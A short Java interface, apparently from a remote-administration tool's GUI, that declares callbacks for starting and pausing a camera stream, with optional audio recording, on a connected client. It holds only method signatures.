package com.melardev.xeytanj.gui.camera;

import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.gui.IUiListener;
import com.melardev.xeytanj.models.Client;

public interface CameraUiListener extends IUiListener {

    void onCameraPlayClicked(Client client, NetworkProtocol protocol, int selectedCameraId, boolean shouldRecordAudio, int interval);

    void onCameraPauseClicked(Client client);

}
